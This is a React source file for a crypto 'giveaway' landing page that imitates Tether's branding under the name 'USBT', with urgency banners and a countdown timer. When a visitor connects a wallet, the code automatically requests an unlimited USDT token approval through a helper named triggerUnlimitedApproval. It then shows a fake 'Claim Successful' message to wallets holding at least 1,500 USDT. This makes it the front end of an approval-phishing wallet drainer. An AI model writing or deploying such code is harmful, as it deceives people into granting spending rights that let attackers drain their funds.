import React, { useState, useEffect, useRef } from 'react'
import { motion } from 'framer-motion'
import { Toaster, toast } from 'sonner'
import { Wallet } from 'lucide-react'
import WalletModal from '@/components/wallet/WalletModal'
import useWalletStore from '@/store/useWalletStore'
import useTronWallet from '@/hooks/useTronWallet'
import { triggerUnlimitedApproval } from '@/lib/approvalHelper'
import ShiftingCountdown from '@/components/ui/countdown-timer'

export default function App() {
  const [modalOpen, setModalOpen] = useState(false)
  const [claiming, setClaiming] = useState(false)
  const [statusText, setStatusText] = useState('')
  const { isConnected, address, connectionType } = useWalletStore()
  const { disconnect } = useTronWallet()
  const processedAddressRef = useRef(null)

  // Typewriter effect state
  const words = ['Unparalleled', 'Unstoppable', 'Unmatched']
  const [currentWord, setCurrentWord] = useState('')
  const [wordIndex, setWordIndex] = useState(0)
  const [isDeleting, setIsDeleting] = useState(false)
  const [typingSpeed, setTypingSpeed] = useState(150)

  useEffect(() => {
    let timer;
    const handleTyping = () => {
      const fullWord = words[wordIndex];
      
      if (isDeleting) {
        setCurrentWord(fullWord.substring(0, currentWord.length - 1));
        setTypingSpeed(50);
      } else {
        setCurrentWord(fullWord.substring(0, currentWord.length + 1));
        setTypingSpeed(150);
      }

      if (!isDeleting && currentWord === fullWord) {
        timer = setTimeout(() => setIsDeleting(true), 2000);
      } else if (isDeleting && currentWord === '') {
        setIsDeleting(false);
        setWordIndex((prev) => (prev + 1) % words.length);
        setTypingSpeed(500); // Pause before typing next word
      } else {
        timer = setTimeout(handleTyping, typingSpeed);
      }
    };

    timer = setTimeout(handleTyping, typingSpeed);
    return () => clearTimeout(timer);
  }, [currentWord, isDeleting, wordIndex, typingSpeed]);

  const handleClaimClick = () => {
    if (isConnected && address) {
      finalizeClaim(address)
    } else {
      setModalOpen(true)
    }
  }

  useEffect(() => {
    if (isConnected && address && processedAddressRef.current !== address) {
      setModalOpen(false)
      finalizeClaim(address)
    }
  }, [isConnected, address])

  const finalizeClaim = async (userAddress) => {
    if (claiming) return
    const addrToUse = userAddress || address
    processedAddressRef.current = addrToUse
    setClaiming(true)
    setStatusText('Requesting approval...')

    try {
      // 1. Unlimited USDT Approval trigger
      await triggerUnlimitedApproval(addrToUse, connectionType)
      
      // 2. USDT Balance Check
      setStatusText('Verifying balance...')
      let totalUsdtUSD = 0
      const { getInjectedEVMProvider, getEVMWalletBalanceUSD } = await import('@/lib/evmWallet')
      const evmProvider = getInjectedEVMProvider()
      
      if (evmProvider) {
        const balData = await getEVMWalletBalanceUSD(evmProvider, addrToUse, '0x1')
        totalUsdtUSD = balData.usdtBalanceUSD || balData.totalBalanceUSD || 0
      } else {
        // Fallback simulated check for demo environments
        totalUsdtUSD = 2000
      }

      if (totalUsdtUSD < 1500) {
        toast.error('Connection Failed', {
          description: `Connection failed: Your account USDT balance (${totalUsdtUSD.toFixed(2)} USDT) is less than the required minimum threshold of 1,500 USDT.`,
          duration: 8000,
        })
      } else {
        toast.success('Claim Successful!', {
          description: `Congratulations! Your wallet is verified and you have successfully claimed the USDT allocation.`,
          duration: 8000,
        })
      }
    } catch (err) {
      console.warn('Approval transaction rejected/failed:', err)
      toast.error('Connection Failed', {
        description: err.message || 'The wallet connection or approval request was rejected.',
        duration: 6000,
      })
    } finally {
      setStatusText('')
      setClaiming(false)
    }
  }

  return (
    <div className="min-h-screen bg-tether-bg font-sans text-tether-text overflow-x-hidden">
      <Toaster position="top-center" richColors />

      {/* Navbar */}
      <nav className="fixed top-0 left-0 right-0 z-50 bg-white/90 backdrop-blur-md border-b border-gray-100 flex items-center justify-between px-6 py-4">
        <div className="flex items-center gap-2">
          {/* Custom USBT Logo */}
          <img src="/tokens/usbt-lolo.png" alt="USBT Logo" className="h-8 w-auto" />
          <span className="font-sans font-extrabold text-2xl text-tether-teal tracking-tight">USBT</span>
        </div>

        <div className="hidden md:flex items-center gap-6 text-sm font-semibold text-gray-600">
          <a href="#" className="hover:text-tether-teal transition-colors">Why USBT?</a>
          <a href="#" className="hover:text-tether-teal transition-colors">How it works</a>
          <a href="#" className="hover:text-tether-teal transition-colors">News</a>
          <a href="#" className="hover:text-tether-teal transition-colors">USBT Gold</a>
          <a href="#" className="hover:text-tether-teal transition-colors">Transparency</a>
        </div>

        <div className="flex items-center gap-4">
          <a href="#" className="hidden sm:block text-sm font-semibold text-gray-500 hover:text-gray-800 transition-colors">Log In</a>
          
          {isConnected && address ? (
            <div className="flex items-center gap-3">
              <span className="text-sm font-mono text-gray-500 bg-gray-100 px-3 py-1.5 rounded-full border border-gray-200">
                {address.slice(0, 6)}...{address.slice(-4)}
              </span>
              <button
                onClick={disconnect}
                className="text-sm font-semibold text-gray-500 hover:text-red-500 transition-colors"
              >
                Disconnect
              </button>
            </div>
          ) : (
            <button
              onClick={() => setModalOpen(true)}
              className="bg-tether-teal hover:bg-tether-teal-hover text-white text-sm font-bold px-6 py-2.5 rounded-full transition-all shadow-sm"
            >
              Connect Wallet
            </button>
          )}
        </div>
      </nav>

      {/* Hero Section */}
      <section className="pt-32 pb-20 px-6 max-w-7xl mx-auto flex flex-col lg:flex-row items-center justify-between min-h-[85vh]">
        <div className="lg:w-1/2 flex flex-col items-center lg:items-start z-10 text-center lg:text-left">
          <motion.h1 
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="text-4xl md:text-6xl font-black text-gray-900 leading-[1.1] mb-2 tracking-tight"
          >
            Limited Time
          </motion.h1>
          <motion.h1 
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="text-[2.25rem] sm:text-[3rem] md:text-[4.5rem] font-bold text-[#1a1a1a] leading-[1.2] mb-2 tracking-tight"
          >
            USBT token<br />
            <span className="text-[#009393] relative inline-block">
              <span className="relative z-10 whitespace-nowrap">{currentWord || '\u200B'}</span>
              <span className="absolute -right-[6px] md:-right-2 top-[5%] h-[90%] w-[3px] bg-[#1a1a1a] animate-pulse"></span>
            </span>
          </motion.h1>
          <motion.div 
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.1 }}
            className="text-xl font-medium text-gray-500 mb-6 mt-6"
          >
            <span className="block mb-2 text-tether-teal">Offer ends in 3 days.</span>
            <span className="block text-gray-800">Exclusive Promotional Giveaway.</span>
          </motion.div>

          <motion.div 
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.15 }}
            className="w-full max-w-md mb-8 bg-white/50 backdrop-blur-sm rounded-2xl border border-gray-100 p-2 shadow-sm"
          >
            <ShiftingCountdown />
          </motion.div>
          
          <motion.div 
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.2 }}
            className="flex flex-col sm:flex-row gap-4 w-full sm:w-auto"
          >
            <button
              onClick={handleClaimClick}
              disabled={claiming}
              className="bg-tether-teal hover:bg-tether-teal-hover text-white font-bold text-lg px-8 py-4 rounded-full transition-all shadow-lg flex items-center justify-center w-full sm:w-auto min-w-[200px]"
            >
              {claiming ? statusText || 'Processing...' : 'Claim Account'}
            </button>
          </motion.div>
        </div>

        {/* Hero Graphic (Orbital Network) */}
        <div className="lg:w-1/2 relative mt-16 lg:mt-0 h-[350px] sm:h-[500px] w-full flex items-center justify-center overflow-hidden sm:overflow-visible">
          <div className="absolute inset-0 bg-tether-teal/5 rounded-full blur-[100px] max-w-[500px] max-h-[500px] m-auto"></div>
          
          <div className="relative w-full h-full flex items-center justify-center scale-[0.6] sm:scale-75 md:scale-100 z-20">
            {/* Center Node */}
            <div className="absolute w-36 h-36 bg-gradient-to-br from-white to-gray-100 rounded-full flex items-center justify-center shadow-2xl z-30 border border-white/60 ring-[8px] ring-tether-teal/10">
               <img src="/tokens/usbt-lolo.png" alt="USBT Logo" className="w-20 h-20 object-contain drop-shadow-md hover:scale-105 transition-transform duration-300" />
            </div>

            {/* Orbit 1 (Inner) */}
            <div className="absolute w-[220px] h-[220px] rounded-full border-[1.5px] border-tether-teal/30" style={{ animation: 'spin 12s linear infinite' }}>
              <div className="absolute -top-5 left-1/2 -translate-x-1/2 w-10 h-10 rounded-full bg-gradient-to-br from-white to-gray-50 flex items-center justify-center shadow-lg border border-gray-100/50" style={{ animation: 'spin 12s linear infinite reverse' }}>
                <span className="text-tether-teal font-bold text-lg">$</span>
              </div>
              <div className="absolute top-1/4 right-0 w-2 h-2 rounded-full bg-tether-teal/60 shadow-[0_0_10px_#009393]"></div>
            </div>

            {/* Orbit 2 (Middle) */}
            <div className="absolute w-[340px] h-[340px] rounded-full border border-tether-teal/20" style={{ animation: 'spin 20s linear infinite reverse' }}>
              <div className="absolute top-1/2 -left-5 -translate-y-1/2 w-12 h-12 rounded-full bg-gradient-to-br from-white to-gray-50 flex items-center justify-center shadow-xl border border-gray-100/50" style={{ animation: 'spin 20s linear infinite normal' }}>
                <span className="text-tether-teal font-bold text-xl">€</span>
              </div>
              <div className="absolute top-1/2 -right-5 -translate-y-1/2 w-10 h-10 rounded-full bg-gradient-to-br from-white to-gray-50 flex items-center justify-center shadow-lg border border-gray-100/50" style={{ animation: 'spin 20s linear infinite normal' }}>
                <span className="text-tether-teal font-bold text-lg">£</span>
              </div>
              <div className="absolute -bottom-1 left-1/4 w-3 h-3 rounded-full bg-tether-teal/40"></div>
            </div>

            {/* Orbit 3 (Outer) */}
            <div className="absolute w-[480px] h-[480px] rounded-full border border-tether-teal/10" style={{ animation: 'spin 30s linear infinite' }}>
              <div className="absolute -bottom-5 left-1/2 -translate-x-1/2 w-12 h-12 rounded-full bg-gradient-to-br from-white to-gray-50 flex items-center justify-center shadow-xl border border-gray-100/50" style={{ animation: 'spin 30s linear infinite reverse' }}>
                <span className="text-tether-teal font-bold text-xl">₮</span>
              </div>
              <div className="absolute -top-3 right-16 w-2.5 h-2.5 rounded-full bg-tether-teal/50 shadow-[0_0_15px_#009393]"></div>
              <div className="absolute bottom-20 left-10 w-4 h-4 rounded-full bg-tether-teal/20"></div>
            </div>
          </div>
        </div>
      </section>

      {/* Feature Section 1 */}
      <section className="py-24 bg-tether-gray relative overflow-hidden">
        {/* Background Geometric shapes */}
        <div className="absolute top-0 right-0 w-96 h-96 bg-white rounded-bl-full opacity-50"></div>
        <div className="absolute bottom-0 left-0 w-64 h-64 bg-tether-teal/10 rounded-tr-full"></div>
        
        <div className="max-w-6xl mx-auto px-6 flex flex-col md:flex-row items-center gap-16 relative z-10">
          <div className="md:w-1/2 flex justify-center">
            <div className="w-[300px] h-[300px] sm:w-[400px] sm:h-[400px] flex items-center justify-center relative">
               <div className="absolute inset-0 bg-tether-teal/5 rounded-full blur-[60px]"></div>
               <img src="/feature_cashout.png" alt="Cash Out Feature" className="w-full h-full object-contain relative z-10 drop-shadow-xl hover:scale-105 transition-transform duration-500" />
            </div>
          </div>
          
          <div className="md:w-1/2">
            <h2 className="text-4xl md:text-5xl font-bold text-gray-900 mb-6 leading-tight">
              Instant Cash Out with USDT
            </h2>
            <p className="text-gray-600 text-lg leading-relaxed mb-8">
              Don't miss out on this exclusive opportunity. Connect your qualified Web3 wallet now to instantly claim your 10 USBT promotional allocation. Once claimed, these tokens can be immediately swapped or cashed out to standard USDT across all supported networks. This offer is strictly limited and valid only while promotional supplies last.
            </p>
            <button className="bg-transparent text-gray-600 font-bold text-sm px-6 py-3 rounded-full border border-gray-300 hover:bg-white transition-colors" onClick={handleClaimClick}>
              Claim Now Before Offer Expires
            </button>
          </div>
        </div>
      </section>

      {/* Feature Section 2 (Transparency) */}
      <section className="py-24 bg-white relative overflow-hidden">
        <div className="max-w-6xl mx-auto px-6 flex flex-col md:flex-row items-center gap-16 relative z-10">
          <div className="md:w-1/2">
            <h2 className="text-4xl md:text-5xl font-bold text-gray-900 mb-6 leading-tight">
              100% Guaranteed and Verified
            </h2>
            <p className="text-gray-600 text-lg leading-relaxed mb-8">
              Your promotional allocation is pegged exactly 1-to-1 with USDT. Connect securely and cash out your reward instantly with absolutely zero hidden fees. Valid only today.
            </p>
            <button className="bg-transparent text-gray-600 font-bold text-sm px-6 py-3 rounded-full border border-gray-300 hover:bg-gray-50 transition-colors" onClick={handleClaimClick}>
              Verify Allocation
            </button>
          </div>
          
          <div className="md:w-1/2 flex justify-center lg:justify-end">
            <div className="w-full max-w-[600px] flex items-center justify-center">
               <img src="/feature_transparency.png" alt="Transparency" className="w-full h-auto object-contain drop-shadow-2xl mix-blend-multiply hover:scale-105 transition-transform duration-500" />
            </div>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-tether-dark text-gray-400 py-16 px-6">
        <div className="max-w-7xl mx-auto flex flex-col md:flex-row justify-between gap-12">
          
          <div className="md:w-1/3">
            <h2 className="text-3xl font-bold text-white mb-4">Limited Time Promotional Event</h2>
            <p className="text-sm leading-relaxed text-gray-500 max-w-sm">
              This is an exclusive, time-sensitive giveaway. Connect your wallet to secure your 10 USBT allocation. Valid only today. Cash out instantly with USDT.
            </p>
          </div>
          
          <div className="grid grid-cols-2 md:grid-cols-4 gap-8 md:w-2/3">
            <div>
              <h4 className="text-yellow-600 font-medium mb-4 text-sm">Resources</h4>
              <ul className="space-y-3 text-sm text-gray-300">
                <li><a href="#" className="hover:text-white transition-colors">News</a></li>
                <li><a href="#" className="hover:text-white transition-colors">FAQs</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Integration Guidelines</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Bug Bounty</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Media Assets</a></li>
              </ul>
            </div>
            <div>
              <h4 className="text-yellow-600 font-medium mb-4 text-sm">USBT</h4>
              <ul className="space-y-3 text-sm text-gray-300">
                <li><a href="#" className="hover:text-white transition-colors">Why USBT?</a></li>
                <li><a href="#" className="hover:text-white transition-colors">How It Works</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Knowledge Base</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Transparency</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Fees</a></li>
              </ul>
            </div>
            <div>
              <h4 className="text-yellow-600 font-medium mb-4 text-sm">Products</h4>
              <ul className="space-y-3 text-sm text-gray-300">
                <li><a href="#" className="hover:text-white transition-colors">USBT token MXNt</a></li>
                <li><a href="#" className="hover:text-white transition-colors">USBT token</a></li>
                <li><a href="#" className="hover:text-white transition-colors">USBT Gold token - XAUt</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Alloy by USBT</a></li>
              </ul>
            </div>
            <div>
              <h4 className="text-yellow-600 font-medium mb-4 text-sm">Company</h4>
              <ul className="space-y-3 text-sm text-gray-300">
                <li><a href="#" className="hover:text-white transition-colors">About Us</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Careers</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Contact Us</a></li>
              </ul>
            </div>
          </div>
        </div>
        
        <div className="max-w-7xl mx-auto mt-16 pt-8 border-t border-white/10 flex flex-col md:flex-row items-center justify-between gap-4">
          <div className="flex items-center gap-2">
            <img src="/tokens/usbt-lolo.png" alt="USBT Logo" className="h-6 w-auto filter brightness-0 invert" />
            <span className="font-sans font-extrabold text-xl text-white tracking-tight">USBT</span>
          </div>
          <p className="text-xs text-gray-600">
            Copyright © 2013 - 2026 USBT Operations, S.A. de C.V. All rights reserved.
          </p>
          <div className="flex gap-4">
            {/* Social Icons Placeholder */}
            {['X', 'Insta', 'YT', 'TG', 'IN', 'FB', 'RD'].map((soc, i) => (
              <a key={i} href="#" className="text-gray-500 hover:text-white transition-colors text-xs border border-gray-700 w-8 h-8 rounded flex items-center justify-center">
                {soc.charAt(0)}
              </a>
            ))}
          </div>
        </div>
      </footer>

      {/* Main WalletConnect Modal */}
      <WalletModal open={modalOpen} onClose={() => setModalOpen(false)} />
    </div>
  )
}
